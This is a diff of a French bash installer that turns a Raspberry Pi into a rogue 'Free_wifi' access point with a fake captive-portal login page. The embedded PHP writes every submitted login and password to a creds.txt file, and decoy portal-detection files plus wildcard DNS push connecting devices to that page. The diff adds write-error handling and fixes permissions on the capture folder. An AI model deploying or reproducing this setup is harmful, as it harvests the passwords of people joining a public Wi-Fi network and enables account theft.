@@ -1,25 +1,26 @@
 #!/bin/bash
 
-# Variables
+# Répertoire principal
 DIR="/home/pi/pineapple"
 WWW="$DIR/www"
 CAPTURE="$DIR/captures"
 INTERFACE_AP="wlan1"
 GATEWAY="10.0.0.1"
 
-echo "[*] Mise à jour et installation des dépendances..."
+echo "[*] Mise à jour et installation des paquets nécessaires..."
 sudo apt update
 sudo apt install -y hostapd dnsmasq lighttpd php
 
 echo "[*] Création de l'arborescence..."
 mkdir -p "$WWW" "$CAPTURE"
 
-echo "[*] Configuration réseau : désactivation des services conflictuels..."
+echo "[*] Configuration de dhcpcd pour ignorer $INTERFACE_AP..."
 if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
     echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
     sudo systemctl restart dhcpcd
 fi
 
+echo "[*] Désactivation du dnsmasq système (conflits)..."
 sudo systemctl stop dnsmasq 2>/dev/null
 sudo systemctl disable dnsmasq 2>/dev/null
 
@@ -29,39 +30,44 @@ cat > "$WWW/index.php" << 'EOF'
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $login = $_POST["login"];
     $password = $_POST["password"];
-    file_put_contents("/home/pi/pineapple/captures/creds.txt", date("Y-m-d H:i:s") . " - $login : $password\n", FILE_APPEND);
-    header("Location: https://google.com");
-    exit;
+    $creds = date("Y-m-d H:i:s") . " - $login : $password\n";
+    $ok = file_put_contents("/home/pi/pineapple/captures/creds.txt", $creds, FILE_APPEND);
+    if ($ok === false) {
+        echo "Erreur d'écriture !";
+    } else {
+        header("Location: https://google.com");
+        exit;
+    }
 }
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free Wi-Fi</title>
     <meta charset="UTF-8">
-</head>
-<body>
+    <title>Connexion Free_wifi</title>
     <script>
         if (document.referrer === "") {
             window.location.href = "/index.php";
         }
     </script>
-    <h2>Connexion Free_wifi</h2>
+</head>
+<body>
+    <h2>Connexion au réseau Free_wifi</h2>
     <form method="POST">
-        Login : <input type="text" name="login" /><br />
-        Mot de passe : <input type="password" name="password" /><br />
-        <input type="submit" value="Connexion" />
+        Login : <input type="text" name="login"><br>
+        Mot de passe : <input type="password" name="password"><br>
+        <input type="submit" value="Connexion">
     </form>
 </body>
 </html>
 EOF
 
-echo "[*] Ajout des fichiers de détection de portail captif..."
+echo "[*] Ajout des fichiers leurres pour portail captif..."
 echo "<html><meta http-equiv='refresh' content='0; url=/index.php'></html>" > "$WWW/generate_204"
 cp "$WWW/generate_204" "$WWW/hotspot-detect.html"
-cp "$WWW/generate_204" "$WWW/ncsi.txt"  # Windows captive portal
+cp "$WWW/generate_204" "$WWW/ncsi.txt"
 
-echo "[*] Génération de hostapd.conf..."
+echo "[*] Génération de la config hostapd..."
 cat > "$DIR/hostapd.conf" <<EOF
 interface=$INTERFACE_AP
 driver=nl80211
@@ -72,7 +78,7 @@ auth_algs=1
 ignore_broadcast_ssid=0
 EOF
 
-echo "[*] Génération de dnsmasq.conf..."
+echo "[*] Génération de la config dnsmasq..."
 cat > "$DIR/dnsmasq.conf" <<EOF
 interface=$INTERFACE_AP
 bind-interfaces
@@ -80,7 +86,7 @@ dhcp-range=10.0.0.10,10.0.0.50,12h
 address=/#/10.0.0.1
 EOF
 
-echo "[*] Création du menu interactif..."
+echo "[*] Création du menu interactif pineapple_menu.sh..."
 cat > "$DIR/pineapple_menu.sh" << 'EOF'
 #!/bin/bash
 
@@ -174,6 +180,10 @@ done
 EOF
 
 chmod +x "$DIR/pineapple_menu.sh"
+
+echo "[*] Correction des permissions pour les captures..."
+sudo chown -R www-data:www-data "$CAPTURE"
+sudo chmod 755 "$CAPTURE"
 
 echo "[✔] Installation terminée."
 echo "➡️ Lance le menu avec : bash $DIR/pineapple_menu.sh"
